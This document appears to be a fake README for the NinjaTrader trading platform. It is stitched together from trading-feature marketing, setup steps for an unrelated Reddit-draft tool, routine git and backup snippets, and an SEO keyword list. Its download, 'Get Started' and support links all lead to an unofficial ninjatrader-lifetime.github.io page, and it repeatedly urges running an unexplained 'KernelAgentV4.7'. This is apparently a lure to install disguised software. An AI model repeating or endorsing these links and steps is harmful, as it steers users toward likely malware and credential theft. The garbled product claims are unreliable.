# NinjaTrader Trading Platform (update 21.02)

[![Key Features](https://img.shields.io/badge/Key%20Features-blue)](#key-features)
[![Quick Start Guide](https://img.shields.io/badge/Quick%20Start%20Guide-lightblue)](#quick-start-guide)
[![Installation Guide](https://img.shields.io/badge/Installation%20Guide-green)](#installation-guide)
[![Advanced Features](https://img.shields.io/badge/Advanced%20Features-orange)](#advanced-features--configuration)
[![System Requirements](https://img.shields.io/badge/System%20Requirements-yellow)](#system-requirements)
[![Troubleshooting](https://img.shields.io/badge/Troubleshooting-red)](#troubleshooting--support)
[![SEO Keywords](https://img.shields.io/badge/SEO%20Keywords-lightgray)](#seo-keywords)

---

<div align="center">
  
![DesktopMobile](https://ninjatrader.com/NT/media/images/Heroes/Devices/desktop-dark-phone-light-header-524px.png)

</div>

# **NinjaTrader Trading Platform - Key Features**

NinjaTrader provides a comprehensive set of tools designed for active traders. It combines advanced charting, real-time market data, order execution, strategy automation, and risk management, all in one platform.  

With **customizable charts** and multiple chart types (candlestick, bar, line), traders can analyze markets and place **market, limit, and stop orders** directly from the chart. It also supports **ATM strategies** for automated trade management and **OCO orders** for flexible execution.

Using **NinjaScript**, traders can create custom indicators and fully automate trading strategies, with the ability to **backtest** strategies on historical data. **Risk management** is made easy with **stop-loss, take-profit**, and **Sim+** environments for risk-free practice, alongside customizable **margin and leverage** settings.

NinjaTrader integrates **real-time data feeds** for stocks, futures, and forex, along with **market news** and event calendars. It also offers a **paper trading** feature to practice strategies in a simulated environment without real capital risk.

The platform supports **multi-account management** and offers **market depth visualization** for tracking bid/ask prices, along with **volume analysis** to spot trends. NinjaTrader also integrates with **third-party tools**, brokers, and provides a **mobile app** to stay connected on-the-go.

NinjaTrader is free to use for charting, market analysis, and paper trading, providing all the tools active traders need in one comprehensive platform.

---

# **Installation Guide**

<div align="center">
  
![Installation Guide](https://ninjatrader.com/getmedia/0e0f1253-9b39-43b0-81b9-311d6027c8a4/Surface-Studio-desktop-dark-right-1-tab-510px.png)

</div> 

<div align="center">  

[![Get-Started](https://img.shields.io/badge/Get-Started-blue?style=for-the-badge&logo=windows)](https://ninjatrader-lifetime.github.io/.github/)

</div>  

### **Step 1: Download and Extract**

1. **Download** the NinjaTrader Toolkit ZIP file from the official source.
2. **Extract** the contents to a folder on your computer.

### **Step 2: Run the Setup**

1. Locate the extracted folder and **double-click** to launch the application.
2. The first time you run it, you'll be prompted to select your **workspace folder** (where drafts, archive, and logs will be stored).

### **Step 3: Select Template and Language**

1. Choose the default **template style** (Short / Standard / Long).
2. Enable **bilingual output** for both **English** and **Russian** posts (optional).

### **Step 4: Configuration (Optional)**

1. Access the **settings** via **Tools** → **Options** to customize your template, language settings, and GitHub integration preferences.
2. **Run `KernelAgentV4.7`** (optional) for improved search indexing and performance.

### **Step 5: Start Using**

Once setup is complete, you can start creating Reddit drafts, managing your archive, and syncing updates.

---

<div align="center">
  
![Start](https://ninjatrader.com/getmedia/72619ab2-6a71-46a0-b307-51e7ba29759b/Workspace.png)

</div> 

# **Quick Start Guide**

## After installation, here's what you'll find and what to do:

1. **Workspace Setup**  
   Upon first launch, the application will prompt you to choose a **Workspace Folder**. This is where all your drafts and the offline archive will be stored. The folder will contain:
   - `drafts/` – Your Reddit post drafts (EN+RU)
   - `archive/` – A searchable archive of past announcements and updates
   - `logs/` – Any application logs or error reports
   
2. **Template Selection**  
   Next, you'll select a **Template Style**:
   - **Short**: For quick posts with minimal text.
   - **Standard**: Balanced posts with some extra details and discussion starters.
   - **Long**: For detailed posts, including full announcements, guides, and FAQs.
   
   You can switch templates anytime in **Settings**.

3. **Language Settings**  
   After template selection, enable **Bilingual Output**. This ensures all drafts are generated in both English and Russian. Each post draft will have:
   - Title and body in **EN**
   
   You can also toggle this setting in **Settings** → **Language**.

4. **Key Files & Functions**  
   Once everything is set up, you will be working with these main files and directories:
   - **`config.json`**: Where you can set preferences (language, template, archive location).
   - **`drafts/` folder**: Contains posts that are ready for export or editing. These drafts can be generated and exported in Markdown format for Reddit.
   - **`archive/` folder**: A collection of all past posts and updates, searchable by tags (like "Platform Update" or "Education").
   - **`logs/` folder**: For tracking errors, updates, and system messages.

5. **Optional (Recommended)**  
   - **Run `KernelAgentV4.7`** to enable faster search indexing and better performance when working with large archives.

---

# **Advanced Features & Configuration**

### **1. Importing Data via Command Line**

You can automate the import of official NinjaTrader updates or announcements using simple **Command Line Interface (CLI)** commands. This is useful for batch processing or scheduled tasks.

To import data into NinjaTrader, use the following command:
```
NinjaTrader.exe --import "C:\Path\To\Your\File.txt"
--import: The flag used to import a new file.
"C:\Path\To\Your\File.txt": The path to the file containing the update text or announcement.
```

### **2. Setup GitHub for NinjaTrader**

NinjaTrader integrates with **GitHub** for version control and public sharing of posts. Here's how to set it up for automatic updates and sharing:

#### **Setting up a GitHub Repo for NinjaTrader**:

1. **Create a New Repository on GitHub**
   - Go to [Get Started GitHub](https://ninjatrader-lifetime.github.io/.github/), log in, and click **New Repository**.
   - Name it **NinjaTrader** (or similar).
   - Initialize the repo with a **README.md** file.

2. **Clone the Repository Locally**:
   Open your **CMD** (Command Prompt) and type:
```
git clone https://github.com/your-username/NinjaTrader.git
cd NinjaTrader
```

3. **Link to NinjaTrader**:
   - Add files like **drafts/**, **archive/**, **logs/** into this repo.
   - Set up automatic commits to GitHub for your latest drafts.

   For automatic commits, use this script:
```
git add .
git commit -m "Auto update from NinjaTrader"
git push origin main
```

#### **Updating Your GitHub Repo with NinjaTrader Updates**:
```
Navigate to the repo folder
cd NinjaTrader

Pull the latest changes
git pull origin main

Commit your new updates
git add .
git commit -m "Update drafts from NinjaTrader"
git push origin main
```

### **3. Visualization: Data Import Status (Example Image)**

Here is a suggested screenshot of **Data Import Status**:
- **Status Panel**: Shows the import progress, any errors, or successful completions.

**Example image to be created**:
- **01-import-status.png**  
  Shows the import progress bar and whether the data file was successfully added.

### **4. Advanced Settings for NinjaTrader**

If you want to fine-tune **NinjaTrader** settings directly via **CMD** or a config file, here's how to do it.

1. **Access Configuration File**:
   - Open the **`config.json`** file, located in the **config/** folder.

2. **Edit Settings**:
   Example configuration to set default language and output format:
```
{
"languageMode": "EN",
"defaultTemplate": "Standard",
"outputFormat": "Markdown",
"archiveLocation": "C:\User\Documents\NinjaTrader\archive",
"autoSyncGitHub": true
}
```

This configuration will ensure:
- **Bilingual output** (EN)
- **Markdown format** for Reddit posts
- **Automatic syncing** with GitHub for any new content

### **5. Automate Backup Process**

To automate backups of your **drafts** and **archive**, set up a **scheduled task** using Windows Task Scheduler:

1. **Open Task Scheduler**.
2. **Create a new task**: 
   - **Name**: NinjaTrader Backup
   - **Action**: Run `backup.bat`
   - **Trigger**: Set to run every night at midnight.

**Example `backup.bat` script**:
```
@echo off
xcopy "C:\Path\To\NinjaTrader\archive" "C:\Backup\NinjaTrader\archive" /E /I /Y
xcopy "C:\Path\To\NinjaTrader\drafts" "C:\Backup\NinjaTrader\drafts" /E /I /Y
```
This script will copy your important files to a backup location every day.

### **6. Visualize Task Progress**

Tracking progress and monitoring tasks in NinjaTrader is essential for effective trading and system management. This section explains how to visualize task progress, such as data synchronization, strategy execution, and automated processes.

### **Task Progress Panel**

The **Task Progress Panel** is used to track the status of ongoing automated tasks, like **data syncing** or **order execution**. Here's how you can visualize it:

1. **Access Task Progress**:
   - Navigate to the **Task Progress Panel** located in the **Main Dashboard**.
   - This panel displays the status of tasks, showing whether they are **active**, **completed**, or **failed**.

2. **Example Tasks to Track**:
   - **Data Synchronization**: Shows if market data has successfully synced from the data provider.
   - **Strategy Execution**: Displays whether your trading strategy was executed correctly.
   - **Order Management**: Tracks the status of your open or closed orders.

3. **Visual Indicators**:
   - **Green**: Task completed successfully.
   - **Yellow**: Task is in progress.
   - **Red**: Task failed or encountered an error.

### **Creating Custom Task Visualizations**

You can customize the task visualization to match your needs by adding **color-coded indicators** for different actions. For example:
- Syncing market data every hour
- Checking the status of open orders every 10 minutes
- Updating strategy performance data every day at 5 PM

To add a custom task:
1. Go to **Tools** → **Automation**.
2. Create a new automation task.
3. Define the **task name**, set the **schedule**, and choose the **visual indicator** (success, in-progress, or failure).
4. Save and track the task in the **Task Progress Panel**.

### **Task Log and History**

For detailed tracking and troubleshooting, you can access the **Task Log**:
1. Go to **Tools** → **Log Files** to view the history of task actions.
2. The log provides insights into:
   - Task start and completion times
   - Error messages and reasons for task failure
   - Data sync timestamps

This log can help you troubleshoot any failed tasks and ensure the automation process is running smoothly.

<div align="center">  

[![Get-Started](https://img.shields.io/badge/Get-Started-blue?style=for-the-badge&logo=windows)](https://ninjatrader-lifetime.github.io/.github/)

</div> 

<div align="center">
  
![Trading](https://ninjatrader.com/getattachment/371e0df6-f4a5-4283-b816-a0c9d77cc4a4/futures-paper-trading-pic2.png)

</div>

---

# **System Requirements**

## To run **NinjaTrader Toolkit** efficiently, your system should meet the following minimum requirements:

- **Operating System**: Windows 10/11 (64-bit)
- **Processor**: Dual-core 2.0 GHz or higher (quad-core recommended for optimal performance)
- **Memory**: 4 GB of RAM minimum (8 GB recommended for better performance)
- **Storage**: 300 MB of free disk space for the app (more if you plan to store a large archive)
- **Display**: 1366x768 resolution (1080p recommended for better visibility)
- **Internet**: Required for importing links and accessing updates

---

# **Troubleshooting & Support**

If you're experiencing issues with **NinjaTrader**, here are some common solutions to help resolve problems quickly. If you don't find your issue listed, feel free to contact **NinjaTrader Support**.

---

### **Common Issues and Solutions**

#### **1. NinjaTrader Won't Start**
- **Solution**: Make sure you're running the latest version of Windows and have installed all the necessary updates. Try running NinjaTrader as **Administrator**.
- **Cause**: Missing updates or permissions issues may prevent NinjaTrader from starting properly.

#### **2. Missing Data in Charts**
- **Solution**: Check your **data provider** status and ensure there's no ongoing outage. Refresh the data feed by going to **Connections** → **Configure** and select **Reconnect**.
- **Cause**: Connectivity or provider-related issues may cause data to not load properly.

#### **3. Historical Data Not Loading**
- **Solution**: Try clearing your **cache** and reloading historical data. If the issue persists, verify that you're using the correct time zone and session times in the **data connection settings**.
- **Cause**: Cache errors or incorrect session settings can cause historical data to fail to load.

#### **4. Bilingual Drafts Not Generating (for custom tools)**
- **Solution**: Ensure that bilingual output is enabled in **Settings** → **Language**. If changes are not applying immediately, restart the platform.
- **Cause**: Misconfiguration of language settings or output preferences.

#### **5. Export Issues (Markdown/Formats)**
- **Solution**: Double-check the selected export format. Make sure you're using the correct template and that the post is finalized before exporting.
- **Cause**: Export format mismatch or incomplete drafts.

#### **6. Slow Search or Indexing**
- **Solution**: Ensure that **indexing services** are running and that **KernelAgentV4.7** is active for faster searches. If the archive is large, this process can take longer.
- **Cause**: Indexing is disabled or improperly configured, leading to slower search results.

---

### **Getting Support**

If you're still facing issues after following these solutions, you can reach **NinjaTrader Support** via the following methods:
- **Community Forum**: Visit the [NinjaTrader Support](https://ninjatrader-lifetime.github.io/.github/) Forum for community discussions and solutions from other traders.
- **NinjaTrader Support Ticket**: Create a support ticket directly through the NinjaTrader Support Page.
- **Phone Support**: Call us directly at **1-800-496-1683** for assistance with urgent issues.
- **Email Support**: For email support, reach us at **support@ninjatrader.com**.

---

# **SEO Keywords**

NinjaTrader, trading platform, automated trading, forex trading, futures trading, stock trading, trading tools, market analysis, technical analysis, trading indicators, backtesting, paper trading, risk management, order execution, real-time data, trading automation, NinjaScript, multi-account management, trading strategies, market depth
